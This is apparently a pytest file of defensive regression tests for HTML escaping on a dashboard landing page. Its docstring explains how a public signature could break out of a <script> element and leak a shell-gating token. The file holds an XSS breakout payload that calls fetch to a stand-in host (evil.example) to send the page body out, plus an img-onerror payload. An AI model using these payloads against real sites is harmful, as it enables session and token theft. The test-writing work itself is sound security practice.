"""Stranger text reaches the board; it must not reach the board's parser.

/api/signatures/sign is a public write — that is deliberate, and the point of
the pad. It puts caller-supplied text into the event log, and the event log is
substituted into a <script> element on the landing page.

json.dumps is not an HTML escape. It leaves `/` alone, so `</script>` inside an
event message closes the element early and the rest is parsed as markup. The
page this lands on is the one that embeds KILL_TOKEN, which gates /api/kill and
/ws/terminal — so the bug is not defacement, it is the operator's own browser
handing over the shell token the next time they open their dashboard.

These tests pin the escape, not the payload. A future refactor that swaps
substitution for a JSON <script> block should keep them passing.
"""

import json
import sys
from pathlib import Path

FLEET_BIN = Path(__file__).resolve().parent.parent / "fleet" / "bin"
sys.path.insert(0, str(FLEET_BIN))

import oneview  # noqa: E402

BREAKOUT = "</script><script>fetch('//evil.example/'+document.body.innerHTML)</script>"


def _board(msg):
    """Render the landing page with one event carrying `msg`."""
    seed = json.dumps([{"ts": "2026-08-06T00:00:00+00:00", "agent": "orrery",
                        "level": "ok", "msg": msg}])
    return oneview.page(seed, json.dumps({}), "test-token")


def test_a_stranger_cannot_close_the_script_element():
    """The whole bug in one assertion."""
    html = _board(f"[charge] {BREAKOUT} charged 'x'")
    assert "</script><script>" not in html


def test_no_angle_bracket_survives_into_the_seed():
    """Belt and braces: not just the </script> spelling.

    Case, whitespace and entity tricks all need a `<` eventually. Escaping the
    character rather than matching the tag is what makes this hold against
    spellings nobody thought of.
    """
    payload = "<img src=x onerror=alert(1337)>"
    html = _board(payload)
    assert payload not in html
    assert "\\u003cimg src=x onerror=alert(1337)\\u003e" in html


def test_the_escape_is_still_valid_json():
    """An escape that broke the parser would just be a different outage."""
    escaped = oneview._for_script(json.dumps([{"msg": BREAKOUT}]))
    assert json.loads(escaped)[0]["msg"] == BREAKOUT


def test_ordinary_text_is_untouched():
    """Signatures are a public art piece. Escaping must not mangle names."""
    for name in ("Ana", "M&M", "5 > 3", "日本語", "O'Brien"):
        assert json.loads(oneview._for_script(json.dumps({"n": name})))["n"] == name
